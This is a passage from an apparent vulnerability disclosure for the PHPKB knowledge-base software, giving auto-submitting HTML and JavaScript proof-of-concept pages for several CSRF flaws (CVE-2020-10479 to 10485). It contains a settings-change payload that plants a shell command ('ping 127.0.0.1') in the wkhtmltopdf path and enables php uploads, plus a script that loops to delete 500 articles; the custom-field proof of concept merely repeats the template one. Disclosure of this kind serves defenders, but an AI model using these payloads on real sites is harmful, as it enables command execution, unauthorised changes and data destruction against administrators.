      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"maxfilesize"</span> <span class="na">value=</span><span class="s">"5120"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;allowed&amp;#95;upload&amp;#95;file&amp;#95;types"</span> <span class="na">value=</span><span class="s">"php"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"searching&amp;#95;method"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"fulltext&amp;#95;mode"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"searchresultsperpage"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;search&amp;#95;files"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"doc&amp;#95;path"</span> <span class="na">value=</span><span class="s">"C&amp;#58;&amp;#92;antiword&amp;#92;antiword&amp;#46;exe"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"ppt&amp;#95;path"</span> <span class="na">value=</span><span class="s">"C&amp;#58;&amp;#92;xampp&amp;#92;htdocs&amp;#92;phpkb&amp;#92;admin&amp;#92;ppthtml&amp;#46;exe"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"xls&amp;#95;path"</span> <span class="na">value=</span><span class="s">"C&amp;#58;&amp;#92;xampp&amp;#92;htdocs&amp;#92;phpkb&amp;#92;admin&amp;#92;xlhtml&amp;#46;exe"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;path"</span> <span class="na">value=</span><span class="s">"C&amp;#58;&amp;#92;xampp&amp;#92;htdocs&amp;#92;phpkb&amp;#92;admin&amp;#92;pdftotext&amp;#46;exe"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;pdf"</span> <span class="na">value=</span><span class="s">"pdf"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"index&amp;#95;attachment"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;autosave"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"autosave&amp;#95;interval"</span> <span class="na">value=</span><span class="s">"120000"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"use&amp;#95;wysiwyg&amp;#95;editor"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;version&amp;#95;history"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;captcha"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"captcha&amp;#95;type"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"recaptcha&amp;#95;site&amp;#95;key"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"recaptcha&amp;#95;secret&amp;#95;key"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"syntax&amp;#95;highlighter&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"shThemeRDark"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;library"</span> <span class="na">value=</span><span class="s">"wkhtmltopdf"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"wkhtmltopdf&amp;#95;path"</span> <span class="na">value=</span><span class="s">"ping&amp;#32;127.0.0.1"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;header"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;footer&amp;#95;type"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;page&amp;#95;numbers"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;page&amp;#95;number&amp;#95;position"</span> <span class="na">value=</span><span class="s">"Left"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pdf&amp;#95;footer"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;meta&amp;#95;keywords"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;meta&amp;#95;desc"</span> <span class="na">value=</span><span class="s">"This&amp;#32;is&amp;#32;demo&amp;#32;meta&amp;#32;description&amp;#46;&amp;#32;You&amp;#32;can&amp;#32;enter&amp;#32;here&amp;#32;your&amp;#32;meta&amp;#32;description&amp;#46;"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"admin&amp;#95;results&amp;#95;perpage"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"&amp;#95;selected&amp;#95;tab&amp;#95;"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit&amp;#95;hd"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit&amp;#95;float&amp;#95;btn"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-creating-a-news-article-cve-2020-10479">Cross-Site Request Forgery when creating a news article (CVE-2020-10479)</h2>
<p>Targeted: Superuser/Editor</p>

<p>Vulnerable file: admin/add-news.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser/Editor;</li>
  <li>go under “news” and click on “add new”;</li>
  <li>write something and click on “save news”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!--Change title with the title of the News --&gt;</span>
<span class="c">&lt;!--Change txtContent with the body of the News --&gt;</span>
<span class="c">&lt;!--Change make_visible to yes to make the news visible, else write no --&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-news.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">value=</span><span class="s">"test"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"txtContent"</span> <span class="na">value=</span><span class="s">"&amp;lt;p&amp;gt;test&amp;lt;&amp;#47;p&amp;gt;"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"make&amp;#95;visible"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"expiry&amp;#95;date"</span> <span class="na">value=</span><span class="s">"2020&amp;#45;01&amp;#45;26"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"autosave&amp;#95;id"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"directsave"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-creating-a-category-cve-2020-10480">Cross-Site Request Forgery when creating a category (CVE-2020-10480)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/add-category.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “categories” and click on “add new”;</li>
  <li>write something and click “save category”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- The name of the category is written in the title parameter --&gt;</span>
<span class="c">&lt;!-- The description of the category is written in the content parameter --&gt;</span>
<span class="c">&lt;!-- To create a public category, write public in the type parameter, to create a private category, write private in the type parameter --&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-category.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"type"</span> <span class="na">value=</span><span class="s">"public"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">value=</span><span class="s">"csrfvulnerability"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"parent&amp;#95;public"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"parent&amp;#95;private"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"content"</span> <span class="na">value=</span><span class="s">"csrfvulnerability"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"group&amp;#95;permissions"</span> <span class="na">value=</span><span class="s">"none"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Save&amp;#32;Category"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-adding-a-new-glossary-term-cve-2020-10481">Cross-Site Request Forgery when adding a new glossary term (CVE-2020-10481)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/add-glossary.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “glossary” and click on “add new”;</li>
  <li>write something and click on “save glossary term”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- The name of the glossary term is written in the term parameter --&gt;</span>
<span class="c">&lt;!-- The description of the glossary term is written in the definition parameter --&gt;</span>
<span class="c">&lt;!-- To create a public glossary term, write yes in the visible parameter, to create a private glossary term, write no in the visible parameter --&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-glossary.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"term"</span> <span class="na">value=</span><span class="s">"testt"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"definition"</span> <span class="na">value=</span><span class="s">"testt"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"visible"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-adding-a-new-article-template-cve-2020-10482">Cross-Site Request Forgery when adding a new article template (CVE-2020-10482)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/add-template.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “article templates”, click on “add”;</li>
  <li>fill random parameters and click “save article template”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- change the title parmeter to change the Article Template title --&gt;</span>
<span class="c">&lt;!-- Change the txtContent parameter to change the body of the Article template --&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-template.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">value=</span><span class="s">"dsa"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"txtContent"</span> <span class="na">value=</span><span class="s">"&amp;lt;p&amp;gt;sda&amp;lt;&amp;#47;p&amp;gt;"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"make&amp;#95;visible"</span> <span class="na">value=</span><span class="s">"active"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"directsave"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-posting-a-comment-cve-2020-10483">Cross-Site Request Forgery when posting a comment (CVE-2020-10483)</h2>
<p>Targeted: Anyone, given the are logged-in</p>

<p>Vulnerable file: admin/ajax-hub.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>post a comment on a random article.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change the aid parameter to the id of the article you want the comment put on --&gt;</span>
<span class="c">&lt;!-- Change the cmt parameter to the actual text comment --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/include/ajax-hub.php?usefor=AddComments&amp;aid=2&amp;nm=&amp;em=&amp;cmt=sdsda&amp;sc=undefined</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Commenting!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-creating-a-new-custom-field-cve-2020-10484">Cross-Site Request Forgery when creating a new custom field (CVE-2020-10484)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/add-field.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “custom fields”, click on “add”;</li>
  <li>fill random parameters and hit “save custom field”;</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- The title of the article template is written in the title parameter --&gt;</span>
<span class="c">&lt;!-- The body of the article template is written in the txtContent parameter--&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/add-template.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">value=</span><span class="s">"dsa"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"txtContent"</span> <span class="na">value=</span><span class="s">"&amp;lt;p&amp;gt;sda&amp;lt;&amp;#47;p&amp;gt;"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"make&amp;#95;visible"</span> <span class="na">value=</span><span class="s">"active"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"directsave"</span> <span class="na">value=</span><span class="s">"Save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-an-article-cve-2020-10485">Cross-Site Request Forgery when deleting an article (CVE-2020-10485)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-articles.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “my articles”;</li>
  <li>click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Articles</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-articles.php?sort=&amp;order=&amp;status=own&amp;aid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

